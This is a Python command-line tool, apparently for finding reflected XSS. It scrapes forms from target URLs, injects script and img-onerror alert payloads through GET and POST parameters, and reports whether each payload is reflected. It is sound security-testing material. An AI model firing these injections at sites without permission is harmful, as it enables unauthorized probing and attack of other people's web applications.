import requests
import sys
import time
from bs4 import BeautifulSoup
import os

# ASCII Banner with Emojis
ascii_banner = r"""
 __  __  _____   _____      😃🚀
 \ \/ / / ____| / ____|    🔍💻
  \  / | (___  | (___      🛠️✨
  /  \  \___ \  \___ \      🔐🕵️
 /  /\ \ ____) | ____) |   📊✅
/_/  \_\_____/ |_____/     🛡️🌐
"""

def animate_ascii_banner(banner):
    """Display the ASCII banner with an animation effect."""
    for line in banner.splitlines():
        print(line)
        time.sleep(0.1)

def scrape_form_fields(url):
    """Scrape form fields from the target URL."""
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        form_data = []
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            fields = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}
            form_data.append({'action': action, 'method': method, 'fields': fields})
        return form_data
    except requests.exceptions.RequestException as e:
        print(f"❌ Error scraping forms: {e}")
        return []

def test_payloads(url, payloads, method="GET", data=None):
    """Test payloads for XSS vulnerabilities."""
    vulnerable = False
    for payload in payloads:
        if method.upper() == "POST":
            for key in data.keys():
                data[key] = payload
            response = requests.post(url, data=data)
        else:
            injection_url = f"{url}?q={payload}"
            response = requests.get(injection_url)
        if payload in response.text:
            print(f"\n🚨 Vulnerable to XSS: {url} with payload: {payload}")
            vulnerable = True
    return vulnerable

def scan_xss(url, payloads, output_file=None):
    print(f"🔍 Scanning URL: {url}")

    forms = scrape_form_fields(url)

    print("\n🌐 Testing GET requests...")
    vulnerable = test_payloads(url, payloads)

    for form in forms:
        print(f"\n📝 Testing form with action: {form['action']} and method: {form['method'].upper()}")
        action_url = url + form['action']
        if form['method'] == 'post':
            vulnerable |= test_payloads(action_url, payloads, method="POST", data=form['fields'])

    if output_file:
        with open(output_file, 'a') as file:
            if vulnerable:
                file.write(f"⚠️ URL: {url} is vulnerable.\n")
            else:
                file.write(f"✅ URL: {url} is not vulnerable.\n")

    if not vulnerable:
        print("✔️ No XSS vulnerabilities found.")

def load_payloads_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return []

    with open(file_path, 'r') as file:
        payloads = [line.strip() for line in file.readlines() if line.strip()]
    print(f"📂 Loaded {len(payloads)} payloads from {file_path}")
    return payloads

def scan_from_file(file_path, payloads, output_file=None):
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return

    with open(file_path, 'r') as file:
        urls = file.readlines()

    for url in urls:
        url = url.strip()
        if url:
            print(f"\n🌐 Scanning URL: {url}")
            scan_xss(url, payloads, output_file)

def generate_report(output_file, html_report_file="report.html"):
    if not os.path.exists(output_file):
        print("❌ Output file not found. Cannot generate report.")
        return

    with open(output_file, 'r') as file:
        content = file.readlines()

    with open(html_report_file, 'w') as html_file:
        html_file.write("<html><head><title>XSS Report</title></head><body>")
        html_file.write("<h1>XSS Vulnerability Report</h1><pre>")
        html_file.writelines(content)
        html_file.write("</pre></body></html>")

    print(f"📄 Report generated: {html_report_file}")

def main():
    animate_ascii_banner(ascii_banner)
    payloads = []
    while True:
        print("\n1️⃣ Use default payloads")
        print("2️⃣ Add custom payloads")
        print("3️⃣ Load payloads from a .txt file")
        print("4️⃣ Proceed with scan")
        choice = input("👉 Choose an option: ")
        if choice == '1':
            payloads = [
                "<script>alert('XSS')</script>",
                "'\"><script>alert('XSS')</script>",
                "<img src='x' onerror='alert(\"XSS\")'>",
            ]
            print("✅ Default payloads loaded.")
        elif choice == '2':
            custom_payload = input("✏️ Enter your custom payload: ")
            payloads.append(custom_payload)
            print("✔️ Custom payload added.")
        elif choice == '3':
            file_path = input("📂 Enter the path to the .txt file containing payloads: ")
            payloads = load_payloads_from_file(file_path)
        elif choice == '4':
            break
        else:
            print("❌ Invalid choice.")

    scan_mode = input("🔧 Enter '1' to scan a single URL or '2' to scan from a .txt file: ")

    output_option = input("📁 Do you want to save the output to a file? (y/n): ").lower()
    output_file = None
    if output_option == 'y':
        output_file = input("📝 Enter the file name for saving the output (e.g., results.txt): ")

    if scan_mode == '1':
        target_url = input("🌐 Enter the URL to scan: ")
        scan_xss(target_url, payloads, output_file)
    elif scan_mode == '2':
        file_path = input("📂 Enter the path to the .txt file containing URLs: ")
        scan_from_file(file_path, payloads, output_file)
    else:
        print("❌ Invalid choice. Please enter '1' or '2'.")

    if output_file:
        generate_report(output_file)

if __name__ == "__main__":
    main()
